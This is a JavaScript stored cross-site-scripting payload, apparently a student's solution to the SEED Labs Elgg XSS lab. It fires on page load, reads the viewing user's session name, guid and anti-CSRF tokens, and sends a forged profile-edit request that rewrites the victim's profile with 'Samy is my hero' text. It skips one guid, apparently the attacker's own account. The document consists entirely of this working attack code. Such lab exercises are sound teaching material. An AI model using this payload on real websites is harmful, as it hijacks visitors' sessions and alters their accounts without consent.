<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
    var name = elgg.session.user.name;
    var guid = elgg.session.user.guid;

	var ts = elgg.security.token.__elgg_ts;
    var token = elgg.security.token.__elgg_token;

    var description = "<p>1905086</p>";
	//Construct the content of your url.
        var sendurl=`http://www.seed-server.com/action/profile/edit`; //FILL IN
        var content = {
            "__elgg_token": token,
            "__elgg_ts": ts,
            "name": name,
            "description": description,
            "accesslevel[description]": "1",
            "briefdescription": "Samy is my hero",
            "accesslevel[briefdescription]": "1",
            "location": "Samy's heart",
            "accesslevel[location]": "1",
            "interests": "To know Samy",
            "accesslevel[interests]": "1",
            "skills": "I like to be Samy",
            "accesslevel[skills]": "1",
            "contactemail": "alisam@yahoo.com",
            "accesslevel[contactemail]": "1",
            "phone": "1234567890",
            "accesslevel[phone]": "1",
            "mobile": "1234567890",
            "accesslevel[mobile]": "1",
            "website": "www.samyhackworld.com",
            "accesslevel[website]": "1",
            "twitter": "samy",
            "accesslevel[twitter]": "1",
            "guid": guid
        };
        
        var formBody = new URLSearchParams(content).toString();
	
	if(guid !== 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(formBody);
	}
	}
</script>